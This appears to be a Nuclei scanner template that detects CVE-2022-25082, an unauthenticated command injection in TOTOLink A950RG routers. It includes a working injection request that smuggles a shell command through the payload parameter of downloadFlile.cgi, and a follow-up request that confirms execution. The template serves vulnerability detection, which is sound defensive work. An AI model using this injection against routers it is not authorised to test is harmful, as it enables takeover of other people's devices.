id: CVE-2022-25082
info:
  name: TOTOLink - Unauthenticated Command Injection
  author: gy741
  severity: critical
  description: The TOTOLink A950RG router models were found to have an unauthenticated
    command injection vulnerability, labeled CVE-2022-25082, that could be exploited
    by attackers to run arbitrary commands through the QUERY_STRING parameter in the
    Main function.
  reference:
  - https://nvd.nist.gov/vuln/detail/cve-2022-25082
  - https://github.com/EPhaha/IOT_vuln/blob/main/TOTOLink/A950RG/README.md
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-25082
    cwe-id: CWE-77
  tags: totolink,cve,cve2022,router,unauth,rce,iot
  metadata:
    impact: The command injection vulnerability in TOTOLink routers can potentially
      lead to unauthorized execution of commands by attackers, posing a significant
      security risk.
    recommendation: It is recommended that TOTOLink users update their A950RG routers
      to the latest firmware version to address the CVE-2022-25082 vulnerability and
      prevent unauthorized command injection.
variables:
  cmd: '`ls>../{{randstr}}`'
requests:
- raw:
  - 'GET /cgi-bin/downloadFlile.cgi?payload={{cmd}} HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /{{randstr}} HTTP/1.1

    Host: {{Hostname}}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body_2
    words:
    - .sh
    - .cgi
    condition: and
  - type: word
    part: header_2
    words:
    - application/octet-stream
  - type: status
    status:
    - 200
